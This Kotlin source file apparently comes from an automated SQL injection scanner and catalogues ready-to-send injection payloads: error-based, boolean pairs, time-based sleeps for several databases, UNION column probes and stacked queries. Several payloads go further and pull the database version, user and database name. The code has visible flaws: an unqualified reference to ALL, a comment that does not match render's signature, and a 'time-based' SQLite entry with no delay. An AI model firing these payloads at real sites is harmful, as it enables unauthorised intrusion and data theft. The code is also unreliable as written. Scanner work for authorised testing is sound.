package com.yourapp.sqliautohunter.domain.payload

import com.yourapp.sqliautohunter.domain.model.VulnerabilityType

/**
 * Payload catalogue for each detection technique.
 *
 * `PayloadTemplate` carries the raw payload plus the technique it targets and
 * a stable `id` used for dedup/telemetry. Templates are grouped by technique
 * so a detector can pull its own set without scanning the whole catalogue.
 *
 * Injection-point contract: every payload is written to be substituted into a
 * single parameter value. The injector rewrites `{param}` to the target param
 * and leaves the surrounding query untouched. Use `render(param, value)` when
 * you need the concrete query fragment; use `raw` when you only need the
 * payload string (e.g. for CSV logging).
 */
data class PayloadTemplate(
    val id: String,
    val raw: String,
    val technique: VulnerabilityType,
    val label: String,
    /** When true, this payload is expected to induce a measurable delay. */
    val inducesDelayMs: Long = 0L
) {
    /**
     * Render the payload against a concrete param name. `{param}` is replaced
     * verbatim; callers responsible for URL-encoding before transmission.
     */
    fun render(param: String): String = raw.replace("{param}", param)

    companion object {
        fun forTechnique(technique: VulnerabilityType): List<PayloadTemplate> =
            ALL.filter { it.technique == technique }
    }
}

object SqliPayloadTemplates {

    // ------------------------------------------------------------------
    // Error-based probes — reflection-driven. Short, cheap, high signal.
    // ------------------------------------------------------------------
    val ERROR_BASED: List<PayloadTemplate> = listOf(
        PayloadTemplate("err_sq",  "{param}'",              VulnerabilityType.ERROR_BASED, "single-quote break"),
        PayloadTemplate("err_dq",  "{param}\"",             VulnerabilityType.ERROR_BASED, "double-quote break"),
        PayloadTemplate("err_par", "{param})",              VulnerabilityType.ERROR_BASED, "paren close"),
        PayloadTemplate("err_bk",  "{param}\\",             VulnerabilityType.ERROR_BASED, "backslash break"),
        PayloadTemplate("err_cmt", "{param}'-- -",          VulnerabilityType.ERROR_BASED, "comment tail"),
        PayloadTemplate("err_cast","{param}' AND 1=CAST('x' AS INT)-- -", VulnerabilityType.ERROR_BASED, "type cast error"),
        PayloadTemplate("err_div", "{param}' AND 1/0-- -",  VulnerabilityType.ERROR_BASED, "division by zero"),
        PayloadTemplate("err_ext", "{param}' AND extractvalue(1,concat(0x7e,version()))-- -",
            VulnerabilityType.ERROR_BASED, "extractvalue leak"),
        PayloadTemplate("err_upd", "{param}' AND updatexml(1,concat(0x7e,user()),1)-- -",
            VulnerabilityType.ERROR_BASED, "updatexml leak"),
        PayloadTemplate("err_pg",  "{param}' AND 1=CAST(version() AS INT)-- -",
            VulnerabilityType.ERROR_BASED, "postgres cast error")
    )

    // ------------------------------------------------------------------
    // Boolean-based — differential pair. Both halves must be sent for a
    // meaningful comparison; detector compares page-similarity between
    // TRUE and FALSE responses against a control baseline.
    // ------------------------------------------------------------------
    val BOOLEAN_BASED: List<PayloadTemplate> = listOf(
        PayloadTemplate("bool_true_1",  "{param}' AND '1'='1",  VulnerabilityType.BOOLEAN_BASED, "true-1"),
        PayloadTemplate("bool_false_1", "{param}' AND '1'='2",  VulnerabilityType.BOOLEAN_BASED, "false-1"),
        PayloadTemplate("bool_true_2",  "{param}' AND 1=1-- -", VulnerabilityType.BOOLEAN_BASED, "true-2"),
        PayloadTemplate("bool_false_2", "{param}' AND 1=2-- -", VulnerabilityType.BOOLEAN_BASED, "false-2"),
        PayloadTemplate("bool_true_3",  "{param}' AND 'a'='a",  VulnerabilityType.BOOLEAN_BASED, "true-3"),
        PayloadTemplate("bool_false_3", "{param}' AND 'a'='b",  VulnerabilityType.BOOLEAN_BASED, "false-3"),
        PayloadTemplate("bool_true_4",  "{param}' AND SUBSTRING('ab',1,1)='a'", VulnerabilityType.BOOLEAN_BASED, "true-sub"),
        PayloadTemplate("bool_false_4", "{param}' AND SUBSTRING('ab',1,1)='b'", VulnerabilityType.BOOLEAN_BASED, "false-sub")
    )

    // ------------------------------------------------------------------
    // Time-based — delayed responses. Sleep durations tuned to Constants.
    // TIME_BASED_SLEEP_SECONDS (5s) so network jitter doesn't false-positive.
    // ------------------------------------------------------------------
    private const val SLEEP_MS = 5_000L

    val TIME_BASED: List<PayloadTemplate> = listOf(
        PayloadTemplate("time_mysql_1",  "{param}' AND SLEEP(5)-- -",
            VulnerabilityType.TIME_BASED, "mysql sleep", SLEEP_MS),
        PayloadTemplate("time_mysql_2",  "{param}' OR SLEEP(5)-- -",
            VulnerabilityType.TIME_BASED, "mysql sleep OR", SLEEP_MS),
        PayloadTemplate("time_pg_1",     "{param}'; SELECT pg_sleep(5)-- -",
            VulnerabilityType.TIME_BASED, "postgres pg_sleep", SLEEP_MS),
        PayloadTemplate("time_mssql_1",  "{param}'; WAITFOR DELAY '0:0:5'-- -",
            VulnerabilityType.TIME_BASED, "mssql waitfor", SLEEP_MS),
        PayloadTemplate("time_mssql_2",  "{param}'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
            VulnerabilityType.TIME_BASED, "mssql conditional", SLEEP_MS),
        PayloadTemplate("time_oracle_1", "{param}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
            VulnerabilityType.TIME_BASED, "oracle dbms_pipe", SLEEP_MS),
        PayloadTemplate("time_sqlite_1", "{param}' AND 1=(SELECT 1 FROM (SELECT 1 FROM (SELECT 1) WHERE 1=1 AND 1=LIKELY(1)) ) -- -",
            VulnerabilityType.TIME_BASED, "sqlite heavy-sub", 0L)
    )

    // ------------------------------------------------------------------
    // Union-based — column-count discovery + reflection probes.
    // ------------------------------------------------------------------
    val UNION_BASED: List<PayloadTemplate> = listOf(
        PayloadTemplate("union_1",   "{param}' UNION SELECT NULL-- -",        VulnerabilityType.UNION_BASED, "union 1-col"),
        PayloadTemplate("union_2",   "{param}' UNION SELECT NULL,NULL-- -",   VulnerabilityType.UNION_BASED, "union 2-col"),
        PayloadTemplate("union_3",   "{param}' UNION SELECT NULL,NULL,NULL-- -", VulnerabilityType.UNION_BASED, "union 3-col"),
        PayloadTemplate("union_4",   "{param}' UNION SELECT NULL,NULL,NULL,NULL-- -", VulnerabilityType.UNION_BASED, "union 4-col"),
        PayloadTemplate("union_ver", "{param}' UNION SELECT version(),NULL,NULL-- -", VulnerabilityType.UNION_BASED, "union version"),
        PayloadTemplate("union_usr", "{param}' UNION SELECT user(),NULL,NULL-- -",    VulnerabilityType.UNION_BASED, "union user"),
        PayloadTemplate("union_dbs", "{param}' UNION SELECT database(),NULL,NULL-- -", VulnerabilityType.UNION_BASED, "union database")
    )

    // ------------------------------------------------------------------
    // Stacked queries — multi-statement probes. Rare in modern stacks but
    // cheap to send; only meaningful when the driver allows it.
    // ------------------------------------------------------------------
    val STACKED: List<PayloadTemplate> = listOf(
        PayloadTemplate("stack_pg",    "{param}'; SELECT 1-- -",       VulnerabilityType.STACKED, "pg stacked"),
        PayloadTemplate("stack_mssql", "{param}'; SELECT 1-- -",       VulnerabilityType.STACKED, "mssql stacked"),
        PayloadTemplate("stack_sleep", "{param}'; SELECT pg_sleep(5)-- -", VulnerabilityType.STACKED, "pg stacked sleep", SLEEP_MS)
    )

    // ------------------------------------------------------------------
    // Aggregate
    // ------------------------------------------------------------------
    val ALL: List<PayloadTemplate> =
        ERROR_BASED + BOOLEAN_BASED + TIME_BASED + UNION_BASED + STACKED

    fun byId(id: String): PayloadTemplate? = ALL.firstOrNull { it.id == id }

    /** Payloads from a specific technique, filtered by a max-count cap. */
    fun forTechnique(technique: VulnerabilityType, cap: Int = Int.MAX_VALUE): List<PayloadTemplate> =
        ALL.asSequence().filter { it.technique == technique }.take(cap).toList()

    /** The five "quick sweep" probes used for the first pass on a new URL. */
    fun quickSweep(): List<PayloadTemplate> = listOfNotNull(
        byId("err_sq"),
        byId("err_cmt"),
        byId("bool_true_1"),
        byId("bool_false_1"),
        byId("time_mysql_1")
    )
}